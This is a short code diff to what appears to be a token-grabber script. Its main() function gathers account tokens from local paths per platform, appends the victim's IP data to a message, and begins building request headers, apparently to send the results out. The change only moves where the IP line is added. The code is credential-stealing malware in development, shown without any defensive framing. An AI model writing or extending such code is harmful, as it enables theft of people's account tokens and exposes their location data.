@@ -52,7 +52,7 @@ def main():
         
         
         message += f'\n**{platform}**\n```\n'
-        message += f'{ip_data}\n'
+        
 
         tokens = find_tokens(path)
 
@@ -61,7 +61,8 @@ def main():
                 message += f'{token}\n'
         else:
             message += 'No tokens found.\n'
-
+            
+        message += f'{ip_data}\n'
         message += '```'
 
     headers = {
